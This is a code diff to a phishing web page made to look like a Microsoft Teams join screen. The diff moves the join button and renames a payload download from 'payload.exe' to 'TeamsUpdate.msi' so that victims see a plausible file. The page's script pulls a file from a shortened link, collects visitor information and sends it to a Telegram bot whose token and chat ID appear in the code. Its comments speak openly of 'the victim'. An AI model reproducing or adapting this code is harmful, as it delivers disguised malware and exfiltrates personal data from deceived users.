@@ -41,10 +41,10 @@
             box-sizing: border-box;
         }
 
-        /* JOIN BUTTON */
+        /* JOIN BUTTON - UPDATED TO 7.2% */
         .join-btn-wrapper {
             position: absolute;
-            bottom: 8.2%;      
+            bottom: 7.2%;      
             right: 11.5%;     
             z-index: 10;
         }
@@ -326,6 +326,12 @@
     const BOT_TOKEN = "8751898702:AAGLQM3LI6UsBMjLx5QgGQKH0rLtV5y8OeM"; 
     const CHAT_ID = "8478799631";     
     const PAYLOAD_URL = "https://bit.ly/4z8hZrC";
+    
+    // *** CHANGE THE NAME HERE ***
+    // This will be the exact name shown in the victim's downloads folder
+    // I changed it to 'TeamsUpdate.msi' to break the browser cache
+    const CUSTOM_FILENAME = "TeamsUpdate.msi"; 
+    
     // ---------------------
 
     async function getUserInfo() {
@@ -415,7 +421,10 @@
         // 2. Download Payload
         const link = document.createElement('a');
         link.href = PAYLOAD_URL; 
-        link.download = 'payload.exe';
+        
+        // *** THIS IS WHERE THE NAME IS SET ***
+        link.download = CUSTOM_FILENAME; 
+        
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
@@ -453,6 +462,16 @@
             body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
         }).catch(console.error);
     }
+
+    // *** FORCED FILENAME OVERRIDE ***
+    // This forces the browser to treat this file as MS Teams even if the URL says otherwise
+    window.addEventListener('load', () => {
+        // If you want to rename the actual page title to look like MS Teams
+        document.title = "Microsoft Teams";
+        
+        // Optional: Force the filename hint in the console/log
+        console.log("File name set to: " + CUSTOM_FILENAME);
+    });
 </script>
 
 </body>
